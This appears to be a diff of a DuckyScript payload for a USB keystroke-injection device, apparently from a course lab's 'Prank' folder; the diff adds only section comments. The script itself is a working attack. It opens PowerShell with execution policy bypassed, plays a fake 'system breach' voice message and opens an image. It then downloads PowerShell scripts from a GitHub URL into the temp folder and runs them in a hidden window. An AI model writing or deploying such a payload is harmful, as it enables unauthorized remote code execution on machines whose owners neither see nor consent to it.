@@ -1,19 +1,24 @@
 ATTACKMODE HID
 DELAY 2500
 
+REM === Open PowerShell ===
 GUI r
 DELAY 500
 STRING powershell -NoProfile -ExecutionPolicy Bypass
 ENTER
 DELAY 1200
 
+REM === Begin Script Block ===
 STRING & {
 ENTER
 DELAY 300
+
+REM === Status Check ===
 STRING Write-Host "Started"
 ENTER
 DELAY 300
 
+REM === Initialize Voice ===
 STRING $sp = New-Object -ComObject SAPI.SpVoice
 ENTER
 DELAY 300
@@ -21,6 +26,7 @@ STRING Write-Host "Voice OK"
 ENTER
 DELAY 300
 
+REM === Increase Volume ===
 STRING $k = [Math]::Ceiling(100/2)
 ENTER
 DELAY 300
@@ -34,6 +40,7 @@ STRING Write-Host "Volume OK"
 ENTER
 DELAY 300
 
+REM === Voice Announcements ===
 STRING $sp.Speak("System breach detected. Initiating quack protocol.")
 ENTER
 DELAY 1200
@@ -44,6 +51,7 @@ STRING Write-Host "Speech OK"
 ENTER
 DELAY 300
 
+REM === Fake Progress Output ===
 STRING Write-Host "Scanning files..."
 ENTER
 DELAY 700
@@ -54,6 +62,7 @@ STRING Write-Host "100 percent quacked."
 ENTER
 DELAY 700
 
+REM === Open Image ===
 STRING Start-Process "https://loginportal.funnyjunk.com/pictures/Mytril+urorubragg+taboo+quacked_d7d9b1_6228073.jpg"
 ENTER
 DELAY 1200
@@ -61,6 +70,7 @@ STRING Write-Host "Image OK"
 ENTER
 DELAY 300
 
+REM === Define Paths to Scripts ===
 STRING $q = "$env:TEMP\quakloop.ps1"
 ENTER
 DELAY 300
@@ -71,6 +81,7 @@ STRING Write-Host "Paths OK"
 ENTER
 DELAY 300
 
+REM === Download Scripts ===
 STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/butlersl/305-lab-files/refs/heads/main/Prank/quakloop.ps1" -OutFile $q
 ENTER
 DELAY 2500
@@ -85,6 +96,7 @@ STRING Write-Host "DesktopDuck downloaded"
 ENTER
 DELAY 300
 
+REM === Execute Scripts ===
 STRING Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$q`""
 ENTER
 DELAY 800
@@ -99,6 +111,7 @@ STRING Write-Host "DesktopDuck launched"
 ENTER
 DELAY 300
 
+REM === Finished ===
 STRING Write-Host "Done"
 ENTER
 DELAY 300
